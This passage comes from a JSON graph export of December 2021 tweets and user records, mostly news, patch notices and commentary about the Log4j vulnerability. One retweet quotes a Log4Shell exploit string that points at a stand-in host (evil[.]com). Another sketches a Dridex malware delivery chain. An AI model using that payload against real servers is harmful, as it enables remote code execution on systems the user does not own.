joined='Fri Jun 13 22:19:20 +0000 2008', name='Piper', username='digitalcaffeine', verified=False)\"}, {\"id\": 2250, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:17:09 +0000 2021', id=1473085093908471811, text='Apache releases new 2.17.0 patch for Log4j to solve denial of service vulnerability https://t.co/5M3qRGGLq8 via @ZDNet &amp; @jgreigj')\"}, {\"id\": 1452, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=298, following=789, id=76288852, joined='Tue Sep 22 09:06:26 +0000 2009', name='Jan Esser \\ud83c\\uddea\\ud83c\\uddfa\\ud83c\\udde9\\ud83c\\uddea\\ud83c\\uddeb\\ud83c\\uddf7', username='januszesser', verified=False)\"}, {\"id\": 1451, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 23:26:29 +0000 2021', id=1473072343387762688, text='@omniprof Ultimately log4j-over-slf4j, from days where optimizing dependencies of frozen/closed source code was inevitable.')\"}, {\"id\": 1311, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 23:20:09 +0000 2021', id=1473070750525534209, text='If you wrote a blog about Log4J #log4Shell mitigations, and that is no longer accurate such as trustURLCodebase=fal\\u2026 https://t.co/FcFgriOc79')\"}, {\"id\": 1313, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/fcfgrioc79')\"}, {\"id\": 470, \"label\": \"privacy\", \"group\": \"Hashtag\", \"title\": \"Node('Hashtag', 'name', name='privacy')\"}, {\"id\": 4346, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Thu Dec 23 17:55:22 +0000 2021', id=1474076175970586625, text=\\\"RT @center_identity: We're here to solve this problem for your business \\ud83e\\uddbe\\\\n\\\\nhttps://t.co/wXF98oxCAJ\\\\n\\\\n#CenterIdentity #DataSecurity #Privacy\\u2026\\\")\"}, {\"id\": 4323, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Thu Dec 23 17:55:53 +0000 2021', id=1474076309169000454, text=\\\"RT @center_identity: We're here to solve this problem for your business \\ud83e\\uddbe\\\\n\\\\nhttps://t.co/wXF98oxCAJ\\\\n\\\\n#CenterIdentity #DataSecurity #Privacy\\u2026\\\")\"}, {\"id\": 3686, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 04:14:24 +0000 2021', id=1473144799532179458, text='New Log4j Attack Vector Discovered https://t.co/FLp8tqbbV2 #databreach  #cybersecurity  #cybercrime  #privacy\\u2026 https://t.co/T3aheSVC6x')\"}, {\"id\": 3682, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 04:14:35 +0000 2021', id=1473144845409476609, text='New Log4j Attack Vector Discovered https://t.co/im0TzwUmyg #databreach  #cybersecurity  #cybercrime  #privacy\\u2026 https://t.co/IKzX6u5TOR')\"}, {\"id\": 3678, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 04:15:03 +0000 2021', id=1473144961176641537, text='RT @shoebhakim: New Log4j Attack Vector Discovered https://t.co/im0TzwUmyg #databreach  #cybersecurity  #cybercrime  #privacy  #ransomware\\u2026')\"}, {\"id\": 468, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:38:56 +0000 2021', id=1473060377231609860, text='RT @surveillancepod: SR67 is live for the latest #privacy &amp; #security news!\\\\n\\\\nMain stories this week:\\\\n- Updates to Log4j exploit\\\\n- Details a\\u2026')\"}, {\"id\": 1881, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 23:57:44 +0000 2021', id=1473080205917011971, text='RT @Cryptolaemus1: We have verified distribution of #Dridex 22203 on Windows via #Log4j #Log4Shell. Class &gt; MSHTA &gt; VBS &gt; rundll32.\\\\nClass:\\u2026')\"}, {\"id\": 1061, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1472939659760185346)\"}, {\"id\": 1060, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='Cryptolaemus1')\"}, {\"id\": 285, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=11770, following=7575, id=32839909, joined='Sat Apr 18 09:23:46 +0000 2009', name='Alexander Knorr', username='opexxx', verified=False)\"}, {\"id\": 438, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:38:16 +0000 2021', id=1473060208767348737, text='RT @TalosSecurity: MORE #Log4j updates from over the weekend, including additional IOCs, #Snort rules and guidance for developers https://t\\u2026')\"}, {\"id\": 284, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:28:13 +0000 2021', id=1473057679849537547, text='RT @RapidSafeguard: Log4j mindmap\\\\n\\\\n#log4j #infosec https://t.co/67PJXo62oq')\"}, {\"id\": 314, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:27:25 +0000 2021', id=1473057477943988226, text='RT @simonwargniez: New Local Attack Vector Expands the Attack Surface of Log4j Vulnerability #log4j #JavaScript #WebSockets \\\\n#CyberSecurity\\u2026')\"}, {\"id\": 319, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:27:18 +0000 2021', id=1473057448097464320, text='New Local Attack Vector Expands the Attack Surface of Log4j Vulnerability #log4j #JavaScript #WebSockets\\u2026 https://t.co/gU7keznk8T')\"}, {\"id\": 318, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=465, following=1328, id=167773807, joined='Sat Jul 17 13:31:13 +0000 2010', name='SIMON WARGNIEZ', username='simonwargniez', verified=False)\"}, {\"id\": 4103, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Thu Dec 23 18:03:07 +0000 2021', id=1474078130365079554, text='Alibaba Employee First Spotted Log4j Software Flaw but Now the Company Is in Hot Water With Beijing - The Wall Stre\\u2026 https://t.co/TNmhrL8Obj')\"}, {\"id\": 4102, \"label\": \"\", \"group\": \"name\", \"title\": \"Node('Entity', 'name', label='EVENT', name='Hot Water With Beijing - The Wall Stre')\"}, {\"id\": 4101, \"label\": \"\", \"group\": \"name\", \"title\": \"Node('Entity', 'name', label='PERSON', name='Alibaba Employee')\"}, {\"id\": 4104, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/tnmhrl8obj')\"}, {\"id\": 3733, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='edskoudis')\"}, {\"id\": 551, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/xhtxkd8yrl')\"}, {\"id\": 4026, \"label\": \"\", \"group\": \"name\", \"title\": \"Node('Entity', 'name', label='CARDINAL', name='146')\"}, {\"id\": 1173, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 23:09:24 +0000 2021', id=1473068042829676547, text='The \\u2018most serious\\u2019 security breach ever is unfolding right now. Here\\u2019s what you need to know. https://t.co/m9qmAOB5Ip')\"}, {\"id\": 1175, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/m9qmaob5ip')\"}, {\"id\": 3208, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 01:12:16 +0000 2021', id=1473098964157173760, text=\\\"@krisrice @OracleSQLDev Sorry to bring this up again.  And, I'm happy to use more formal channels, opposed to Twitt\\u2026 https://t.co/UriGaZ103R\\\")\"}, {\"id\": 3213, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1470555550303801348)\"}, {\"id\": 3212, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='OracleSQLDev')\"}, {\"id\": 3211, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='krisrice')\"}, {\"id\": 3210, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/urigaz103r')\"}, {\"id\": 608, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='http://pbs.twimg.com/tweet_video_thumb/fheoa8kx0aqswim.jpg')\"}, {\"id\": 56, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:34:32 +0000 2021', id=1473059269822013445, text=\\\"Why is the Log4j cybersecurity flaw the 'most serious' in decades? https://t.co/wSOgZFd2EF https://t.co/GRtMNwwUnK\\\")\"}, {\"id\": 59, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='http://pbs.twimg.com/media/fhfbmxtxmbkiz_s.jpg')\"}, {\"id\": 58, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/wsogzfd2ef')\"}, {\"id\": 805, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:47:25 +0000 2021', id=1473062510928535559, text='RT @BleepinComputer: Log4j vulnerability now used to install Dridex banking malware - @LawrenceAbrams\\\\nhttps://t.co/P34gtrvjix')\"}, {\"id\": 136, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1472968377660583945)\"}, {\"id\": 135, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='LawrenceAbrams')\"}, {\"id\": 134, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='BleepinComputer')\"}, {\"id\": 133, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/p34gtrvjix')\"}, {\"id\": 109, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:33:34 +0000 2021', id=1473059024325287942, text='RT @NSA_CSDirector: Ghidra Version 10.1 released!  *Remediates the Log4J vulnerability* Includes many new features/capabilities, performanc\\u2026')\"}, {\"id\": 112, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1469439084091355141)\"}, {\"id\": 111, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='NSA_CSDirector')\"}, {\"id\": 3009, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=104, following=302, id=1325534445282217985, joined='Sun Nov 08 20:23:45 +0000 2020', name='Elias KOlfinn Wylde', username='EKOcasts', verified=False)\"}, {\"id\": 3008, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 01:06:58 +0000 2021', id=1473097630473408520, text=\\\"RT @TinkerSec: It's one thing dropping a 0day on a Friday.\\\\n\\\\nThat's a dick move.\\\\n\\\\nBut continuously dropping a string of vulns at the end of\\u2026\\\")\"}, {\"id\": 3527, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 04:30:20 +0000 2021', id=1473148811061170180, text='RT @motakasoft: GitHub Trending Archive, 19 Dec 2021, Java. logpresso/CVE-2021-44228-Scanner, FabricMC/fabric-example-mod, kozmer/log4j-she\\u2026')\"}, {\"id\": 3528, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 04:30:10 +0000 2021', id=1473148766362677250, text='GitHub Trending Archive, 19 Dec 2021, Java. logpresso/CVE-2021-44228-Scanner, FabricMC/fabric-example-mod, kozmer/l\\u2026 https://t.co/ccl8avoDTw')\"}, {\"id\": 2382, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=535, following=523, id=993040996744159233, joined='Sun May 06 08:13:18 +0000 2018', name='motakasoft', username='motakasoft', verified=False)\"}, {\"id\": 3673, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/hbx8ktwf6y')\"}, {\"id\": 666, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/n3i2v05lkc')\"}, {\"id\": 3244, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='http://pbs.twimg.com/media/fhgcg3nvkam7qr3.jpg')\"}, {\"id\": 1690, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 23:41:33 +0000 2021', id=1473076133235150858, text='RT @CloneSystemsInc: New Local Attack Vector Expands the Attack Surface of Log4j Vulnerability\\\\n\\\\n@CloneSystemsInc is here to assist! Our Pen\\u2026')\"}, {\"id\": 1692, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1472966234312486917)\"}, {\"id\": 1691, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='CloneSystemsInc')\"}, {\"id\": 3283, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 01:28:08 +0000 2021', id=1473102956564262915, text='RT @Mk13Of: CISA published an emergency directive for Log4j #CloudComputing via https://t.co/yvcbJx4uwh https://t.co/gHu5QwmoEG')\"}, {\"id\": 2395, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:29:09 +0000 2021', id=1473088114931511299, text='CISA published an emergency directive for Log4j #CloudComputing via https://t.co/yvcbJx4uwh https://t.co/gHu5QwmoEG')\"}, {\"id\": 2396, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=370, following=2271, id=1373815960008863746, joined='Mon Mar 22 01:57:22 +0000 2021', name='mohammad13', username='Mk13Of', verified=False)\"}, {\"id\": 2399, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/ghu5qwmoeg')\"}, {\"id\": 2398, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/yvcbjx4uwh')\"}, {\"id\": 3610, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/ppxou7tuap')\"}, {\"id\": 4206, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Thu Dec 23 17:58:06 +0000 2021', id=1474076866772615168, text='Examining Log4j Vulnerabilities in Connected Cars and Charging Stations https://t.co/uxkCXxzSn8')\"}, {\"id\": 4208, \"label\": \"\", \"group\": \"name\", \"title\": \"Node('Entity', 'name', label='PERSON', name='Charging Stations')\"}, {\"id\": 4204, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/uxkcxxzsn8')\"}, {\"id\": 4046, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=1365, following=3692, id=225581432, joined='Sat Dec 11 23:12:13 +0000 2010', name='Matt Franz \\ud83d\\udc89\\ud83d\\udc89\\ud83d\\udc89 \\ud83d\\ude37 \\ud83d\\udc36 \\ud83d\\ude1c \\ud83c\\udf84', username='seclectech', verified=False)\"}, {\"id\": 4045, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Thu Dec 23 18:05:55 +0000 2021', id=1474078832856641545, text='More like https://t.co/KOkOMCPg0N https://t.co/rQjJBZuK59')\"}, {\"id\": 771, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=115, following=583, id=723534791644164096, joined='Fri Apr 22 15:31:51 +0000 2016', name='Zambo', username='zamboughnuts', verified=False)\"}, {\"id\": 770, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:50:57 +0000 2021', id=1473063398309081089, text='So I *was* going to spend the day doing documentation. Then my boss was like \\\"patch the log4j on this server\\\"\\\\n\\\\nTurn\\u2026 https://t.co/2Avy0OB6FY')\"}, {\"id\": 3866, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 13:48:00 +0000 2021', id=1473289148417122306, text=\\\"RT @NCSC: You may have seen us talking about #Log4j over the past week, and wondering what it's all about. \\\\n\\\\nIf you own a business, big or\\u2026\\\")\"}, {\"id\": 3868, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1472935692686839809)\"}, {\"id\": 3845, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='NCSC')\"}, {\"id\": 644, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/myjdjc8lhp')\"}, {\"id\": 1964, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1472965346692902912)\"}, {\"id\": 621, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:58:01 +0000 2021', id=1473065179109806083, text='Why is the Log4j cybersecurity flaw the \\u2018most serious\\u2019 in\\\\xa0decades? https://t.co/vooihdIxU7')\"}, {\"id\": 623, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/vooihdixu7')\"}, {\"id\": 118, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/rmnl3goohb')\"}, {\"id\": 217, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='http://pbs.twimg.com/media/fheb81owyacza0x.jpg')\"}, {\"id\": 2266, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:18:02 +0000 2021', id=1473085315770306561, text='Log4J security advisory information https://t.co/h177oO0UFr')\"}, {\"id\": 2268, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/h177oo0ufr')\"}, {\"id\": 2485, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:33:15 +0000 2021', id=1473089145794826241, text='RT @zapstiko: \\ud83d\\udce2 #Log4j Vulns ~ @1ZRR4H\\\\n\\\\n1) CVE-2021-44228 (RCE) - Critical\\\\nPayload: ${jndi:ldap://evil[.]com:1389/a}\\\\n\\\\n2) CVE-2021-45046 (RC\\u2026')\"}, {\"id\": 2488, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1472850400130723840)\"}, {\"id\": 545, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=8217, following=1972, id=37090957, joined='Sat May 02 00:36:28 +0000 2009', name='Germ\\u00e1n Fern\\u00e1ndez \\ud83c\\udde8\\ud83c\\uddf1', username='1ZRR4H', verified=False)\"}, {\"id\": 2487, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='zapstiko')\"}, {\"id\": 4195, \"label\": \"\", \"group\": \"name\", \"title\": \"Node('Entity', 'name', label='ORG', name='LOG4J')\"}, {\"id\": 4427, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Thu Dec 23 18:08:53 +0000 2021', id=1474079578251481104, text='Good News For Sysadmins! CISA Releases Log4j Scanner To Help You Find All The Things You Need To\\\\xa0Patch https://t.co/Hpg8gwUSZx')\"}, {\"id\": 4429, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/hpg8gwuszx')\"}, {\"id\": 1010, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=1631, following=2532, id=19974210, joined='Tue Feb 03 14:38:34 +0000 2009', name='Illtud Daniel', username='illtud', verified=False)\"}, {\"id\": 1009, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 23:00:33 +0000 2021', id=1473065815708774419, text='RT @rwincey: Since these @VMware @mobileiron CVE-2021-44228 #log4j payloads appear to already been circulating around the bug bounty (and l\\u2026')\"}, {\"id\": 3877, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 13:46:49 +0000 2021', id=1473288853112901638, text='@gilbert_ghazal Both vulnerabilities (RCE with JNDI lookups and DoS by means of infinite recursions) rely on user-g\\u2026 https://t.co/smqPEeu7fL')\"}, {\"id\": 3881, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1473278694483542016)\"}, {\"id\": 3880, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='gilbert_ghazal')\"}, {\"id\": 3879, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/smqpeeu7fl')\"}, {\"id\": 1286, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 23:16:22 +0000 2021', id=1473069798019899398, text='Need a break from your day or the grind of #log4j #log4jshell listen to Jianna Andrews #bluesmusic 62 secs of joy &amp;\\u2026 https://t.co/fHetxRbFFT')\"}, {\"id\": 1289, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/fhetxrbfft')\"}, {\"id\": 1766, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 23:49:42 +0000 2021', id=1473078186229469185, text=\\\"RT @AlyssaM_InfoSec: Hey Blue Teams, have you thanked your developers and SREs yet?\\\\n\\\\nI bet most engineering teams are like ours, that they'\\u2026\\\")\"}, {\"id\": 96, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:33:13 +0000 2021', id=1473058937884839937, text='Hey Blue Teams, have you thanked your developers and SREs yet?\\\\n\\\\nI bet most engineering teams are like ours, that th\\u2026 https://t.co/dZjGRIMsRD')\"}, {\"id\": 95, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=58444, following=4589, id=922816932860088320, joined='Tue Oct 24 13:27:56 +0000 2017', name='Alyssa Miller \\ud83d\\udc51 Duchess of Hackington', username='AlyssaM_InfoSec', verified=True)\"}, {\"id\": 499, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='News24')\"}, {\"id\": 2566, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:40:06 +0000 2021', id=1473090869419024385, text='RT @MalwareTechBlog: Log4j FUD chronicles continued https://t.co/1tyLku9qO5')\"}, {\"id\": 2368, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=3307, following=142, id=577287055, joined='Fri May 11 16:43:05 +0000 2012', name='Lavasocks', username='ImNickHuber', verified=False)\"}, {\"id\": 2367, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:27:07 +0000 2021', id=1473087599523004417, text='RT @campuscodi: Profero has released a tool to scan internal (only) subnets for vulnerable Log4j web services\\\\n\\\\nhttps://t.co/poNCCDEC7N http\\u2026')\"}, {\"id\": 4309, \"label\": \"\", \"group\": \"name\", \"title\": \"Node('Entity', 'name', label='ORG', name='Log4Shell\\\\xa0 https://t.co/SkoMYC3zlq')\"}, {\"id\": 357, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/usv6p6ppvn')\"}, {\"id\": 936, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:58:28 +0000 2021', id=1473065292872007683, text='This is crazy stuff. Log4j is the most popular logging library for Java based software and these software are expos\\u2026 https://t.co/9yOHY6yErp')\"}, {\"id\": 938, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/9yohy6yerp')\"}, {\"id\": 4382, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1474049142016159753)\"}, {\"id\": 3802, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=36, following=113, id=2973706670, joined='Sun Jan 11 03:00:03 +0000 2015', name='Shashank Bhardwaj', username='SaysShashank', verified=False)\"}, {\"id\": 3801, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 13:52:05 +0000 2021', id=1473290179339165703, text='Learn how to put mitigations in place to reduce the threat surface while you are identifying exploitable processes\\u2026 https://t.co/ZGRgqWkuFz')\"}, {\"id\": 3981, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=16619, following=7606, id=1674589274, joined='Fri Aug 16 02:27:31 +0000 2013', name='Chuck Brooks', username='ChuckDBrooks', verified=False)\"}, {\"id\": 3980, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 13:41:18 +0000 2021', id=1473287463699374084, text='What is the log4j vulnerability and should I do anything to protect myself? - The Washington Post https://t.co/NeSdgSFMm1')\"}, {\"id\": 4138, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Thu Dec 23 18:02:30 +0000 2021', id=1474077971610746881, text=\\\"@EnvisionWare Shouldn't you also let folks know there is a log4j fix\\\\nfor a vulnerability on PrinterOn installations?\\\")\"}, {\"id\": 4142, \"label\": \"\", \"group\": \"name\", \"title\": \"Node('Entity', 'name', label='ORG', name='PrinterOn')\"}, {\"id\": 4141, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1471608560442302467)\"}, {\"id\": 4140, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='EnvisionWare')\"}, {\"id\": 1977, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='CNNnewsroom')\"}, {\"id\": 2513, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:35:20 +0000 2021', id=1473089668405395457, text='RT @Luc_East: #log4j Return of the JNDI https://t.co/gvZyRVH0OE')\"}, {\"id\": 272, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1472857013394755597)\"}, {\"id\": 271, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='Luc_East')\"}, {\"id\": 270, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='http://pbs.twimg.com/media/fhcjebmxmamwbr7.png')\"}, {\"id\": 2194, \"label\": \"mondaythoughts\", \"group\": \"Hashtag\", \"title\": \"Node('Hashtag', 'name', name='mondaythoughts')\"}, {\"id\": 2193, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:14:07 +0000 2021', id=1473084329882497029, text='RT @CDWGWAGov: Professional IT Services | CDW Amplified Services #digital #mondaythoughts #log4 #bigdata #analytics #security #devops #Log4\\u2026')\"}, {\"id\": 316, \"label\": \"javascript\", \"group\": \"Hashtag\", \"title\": \"Node('Hashtag', 'name', name='javascript')\"}, {\"id\": 4420, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Thu Dec 23 17:52:16 +0000 2021', id=1474075396794724353, text='RT @MiriamAsensi: Detect Log4j vulnerability with HCL BigFix https://t.co/DGD9Vpf3Pe via @YouTube \\\\n\\\\n#hclswlobp #nocode #javascript #github\\u2026')\"}, {\"id\": 4418, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Thu Dec 23 17:52:17 +0000 2021', id=1474075402314338310, text='RT @MiriamAsensi: Detect Log4j vulnerability with HCL BigFix https://t.co/DGD9Vpf3Pe via @YouTube \\\\n\\\\n#hclswlobp #nocode #javascript #github\\u2026')\"}, {\"id\": 4413, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Thu Dec 23 17:52:18 +0000 2021', id=1474075407150460932, text='RT @MiriamAsensi: Detect Log4j vulnerability with HCL BigFix https://t.co/DGD9Vpf3Pe via @YouTube \\\\n\\\\n#hclswlobp #nocode #javascript #github\\u2026')\"}, {\"id\": 4395, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Thu Dec 23 17:52:32 +0000 2021', id=1474075464553615367, text='RT @MiriamAsensi: Detect Log4j vulnerability with HCL BigFix https://t.co/DGD9Vpf3Pe via @YouTube \\\\n\\\\n#hclswlobp #nocode #javascript #github\\u2026')\"}, {\"id\": 3865, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 13:48:55 +0000 2021', id=1473289381154902024, text='RT @simonwargniez: New Local Attack Vector Expands the Attack Surface of Log4j Vulnerability #log4j #JavaScript #WebSockets \\\\n#CyberSecurity\\u2026')\"}, {\"id\": 461, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:39:16 +0000 2021', id=1473060461796999169, text='RT @simonwargniez: New Local Attack Vector Expands the Attack Surface of Log4j Vulnerability #log4j #JavaScript #WebSockets \\\\n#CyberSecurity\\u2026')\"}, {\"id\": 322, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:27:22 +0000 2021', id=1473057465893892099, text='RT @simonwargniez: New Local Attack Vector Expands the Attack Surface of Log4j Vulnerability #log4j #JavaScript #WebSockets \\\\n#CyberSecurity\\u2026')\"}, {\"id\": 320, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:27:23 +0000 2021', id=1473057469945495564, text='RT @simonwargniez: New Local Attack Vector Expands the Attack Surface of Log4j Vulnerability #log4j #JavaScript #WebSockets \\\\n#CyberSecurity\\u2026')\"}, {\"id\": 3464, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1473135668519833603)\"}, 